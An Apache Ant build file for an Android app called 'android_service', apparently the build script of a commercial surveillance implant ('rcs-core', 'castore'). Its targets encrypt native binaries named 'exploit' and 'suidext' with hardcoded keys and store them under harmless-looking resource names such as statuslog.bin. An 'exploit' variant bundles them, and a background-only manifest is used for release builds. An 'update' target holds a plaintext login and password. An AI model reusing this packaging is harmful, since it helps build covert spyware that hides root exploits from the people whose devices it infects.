<?xml version="1.0" encoding="UTF-8"?>
<project name="android_service" default="help">

	
	<taskdef resource="net/sf/antcontrib/antlib.xml">
		<classpath>
			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
		</classpath>
	</taskdef>

	<taskdef name="iff" classname="net.sf.antcontrib.logic.IfTask" onerror="ignore">
		<classpath>
			<pathelement location="antlibs/ant-contrib-1.0b3.jar" />
		</classpath>
	</taskdef>
	

	<taskdef name="crypter" classname="com.example.ant.Crypter">
		<classpath>
			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
		</classpath>
	</taskdef>

	<taskdef name="random" classname="com.example.ant.RandomString">
		<classpath>
			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
			<fileset dir="${basedir}/../crypter/lib">
				<include name="**/*.jar" />
				<include name="**/*.zip" />
			</fileset>
		</classpath>
	</taskdef>


	<loadproperties srcFile="local.properties" />
	<property file="ant.properties" />
	<loadproperties srcFile="project.properties" />
	<property name="ruby.path" value="C:/Ruby193/bin" />
	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
	<import file="${sdk.dir}/tools/ant/build.xml" />
	
	<fail message="sdk.dir is missing. Make sure to generate local.properties using 'android update project'" unless="sdk.dir" />
		
	<!-- version-tag: 2011102401 -->
	<!-- import file="${sdk.dir}/tools/ant/build.xml" -->

	<path id="android.antlibs">
		<pathelement path="${sdk.dir}/tools/lib/anttasks.jar" />
		<pathelement path="${sdk.dir}/tools/lib/sdklib.jar" />
		<pathelement path="${sdk.dir}/tools/lib/androidprefs.jar" />
	</path>
	
	
	<!-- extension targets. Uncomment the ones where you want to do custom work
	     in between standard targets -->
	<filterset id="dateFilterSet">
		<filter token="DATE" value="${TODAY}" />
	</filterset>

	<target name="salt" unless="randomSalt">
		<random len="8" property="randomSalt">
		</random>
		<echo>RandomSalt:${randomSalt}</echo>
	</target>

	<target name="key">
		<random len="8" property="randomKey">
		</random>
		<echo>RandomKey:${randomKey}</echo>
	</target>

	<target name="encrypt-messages" depends="salt">
		<delete file="res/raw/messages.bin" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
	</target>

	<target name="encrypt-manifest" depends="salt">
		<delete file="res/raw/layout.bin" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="0xA83E0F44BD7A4D20" inputFile="preprocess/ManifestSigned.apk" outputFile="res/raw/layout.bin" />
	</target>

	<target name="encrypt-exploit" depends="salt">
		<delete file="res/raw/statusdb.bin" />
		<delete file="res/raw/statuslog.bin" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
	</target>

	<target name="encrypt-noexploit">
		<delete file="res/raw/statusdb.bin" />
		<delete file="res/raw/statuslog.bin" />
		<touch file="res/raw/statusdb.bin" />
		<touch file="res/raw/statuslog.bin" />
	</target>

	<target name="encrypt-nomanifest">
		<delete file="res/raw/layout.bin" />
		<touch file="res/raw/layout.bin" />
	</target>

	<target name="libsnoexp" depends="encrypt-messages, encrypt-noexploit, encrypt-nomanifest">
	</target>

	<target name="libsexp" depends="encrypt-messages, encrypt-exploit, encrypt-manifest">
	</target>

	<!-- = = = = = = = = = = = = = = = = =
          macrodef: set-cfg
          copies Cfg.java considering:
          - kind: debug, release
          - version: 2,3     
          TODO     
         = = = = = = = = = = = = = = = = = -->
	<macrodef name="set-cfg">
		<attribute name="kind" />
		<attribute name="version" />
		<sequential>
			<echo message="version: @{version}" />
			<echo message="kind: @{kind}" />

			<iff>
				<and>
					<equals arg1="@{version}" arg2="v2" />
					<not>
						<equals arg1="@{kind}" arg2="debug" />
					</not>
				</and>
				<then>
					<echo message="Copy BackGround" />
					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
						<filterset>
							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
						</filterset>
					</copy>
				</then>
				<else>
					<echo message="Copy Activity" />
					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
						<filterset>
							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
						</filterset>
					</copy>
				</else>
			</iff>

			<switch value="@{kind}">
				<case value="debug">
					<echo message="set debug" />
					<antcall target="libsnoexp" />
					<var name="isdebug" value="true" />
					<var name="isexploit" value="false" />
					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
					<delete file="assets/statuslog" />
					<delete file="assets/statusdb" />
				</case>
				<case value="release">
					<echo message="set release" />
					<antcall target="libsnoexp" />
					<var name="isdebug" value="false" />
					<var name="isexploit" value="false" />
					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
					<delete file="assets/statuslog" />
					<delete file="assets/statusdb" />
				</case>
				<case value="exploit">
					<echo message="set exploit" />
					<antcall target="libsexp" />
					<var name="isdebug" value="false" />
					<var name="isexploit" value="true" />
					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
					<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
					<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
				</case>
			</switch>

			<echo message="copy resources and Cfg" />
			<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
			<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
				<filterset>
					<filter token="DEBUG" value="${isdebug}" />
					<filter token="EXCEPTION" value="${isdebug}" />
					<filter token="EXPLOIT" value="${isexploit}" />
					<filter token="DEMO" value="false" />
					<filter token="KEYS" value="false" />
					<filter token="FILE" value="true" />
					<filter token="RANDOM" value="${randomSalt}" />
					<filter token="VERSION" value="@{version}" />
				</filterset>
			</copy>

		</sequential>
	</macrodef>

	<target name="reverse">
		<echo message="Reverse" />
		<deltree dir="reverse" />
		<copy file="bin/android_service-release.apk" toDir="reverse" />
		<unzip src="reverse/android_service-release.apk" dest="reverse" />

		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
			<arg value="reverse/classes.dex" />
		</exec>
		<exec executable="..\..\HT\Reversing\jd-gui.exe">
			<arg value="reverse/classes.dex.dex2jar.jar" />
		</exec>

	</target>

	<target name="dist" depends="build">
		<input message="Version (8.1_RC1)?" addproperty="do.version" defaultvalue="8.1_RC1" />
		<mkdir dir="../dist/${do.version}" />
		<copy file="bin/core.android" toDir="../dist/${do.version}" overwrite="true" />
		<zip destfile="../dist/${do.version}/android_sources.zip" basedir="." />
		<checksum>
			<fileset dir="../dist/${do.version}/">
				<include name="*" />
			</fileset>
		</checksum>
	</target>


	<macrodef name="updaterelease">
		<attribute name="server" />
		<attribute name="login" />
		<attribute name="password" />
		<attribute name="file" />
		<attribute name="filename" />
		<sequential>
			<echo>@{server}</echo>

			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
				<arg value="${rcscore.path}/rcs-core.rb" />
				<arg value="-u" />
				<arg value="@{login}" />
				<arg value="-p" />
				<arg value="@{password}" />
				<arg value="-d" />
				<arg value="@{server}" />
				<arg value="-n" />
				<arg value="android" />
				<arg value="-a" />
				<arg value="@{file}" />
				<arg value="-A" />
				<arg value="@{filename}" />
			</exec>

		</sequential>
	</macrodef>

	<target name="update">
		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="bin/core.android" filename="core" />
	</target>

	<target name="help">
		<echo>ant build :  full build</echo>
		<echo>ant dist : create a dist zip in ../dist</echo>
		<echo>ant set-debug : make messages.bin and cfg.java, for debug</echo>
		<echo>ant set-release : make messages.bin and cfg.java, for release</echo>
		<echo>ant update : uploads the core to castore</echo>
	</target>

	<target name="build" depends="salt">
		<for list="v2,vdefault" param="version">
			<sequential>
				<echo message="==============" />
				<echo message="===  BUILD === ------------------------------------------------------------" />
				<echo message="==============" />
				<echo>Version @{version}</echo>

				<for list="debug,release" param="kind">
					<sequential>
						<antcall target="clean" />

						<echo message="bin/@{version}/@{kind}/core.android" />
						<set-cfg version="@{version}" kind="@{kind}" />
						<mkdir dir="output/@{version}/@{kind}" />

						<iff>
							<equals arg1="@{kind}" arg2="debug" />
							<then>
								<echo message="==============" />
								<echo>call debug</echo>
								<antcall target="debug" inheritAll="false" />
								<copy file="bin/android_service-debug.apk" toFile="output/@{kind}/@{version}/core.android" overwrite="true" />
							</then>
							<else>
								<echo message="==============" />
								<echo>call release</echo>
								<antcall target="release" inheritAll="false" />
								<copy file="bin/android_service-release-unsigned.apk" toFile="output/@{kind}/@{version}/core.android" overwrite="true" />
							</else>
						</iff>

					</sequential>
				</for>
			</sequential>
		</for>
	</target>

</project>
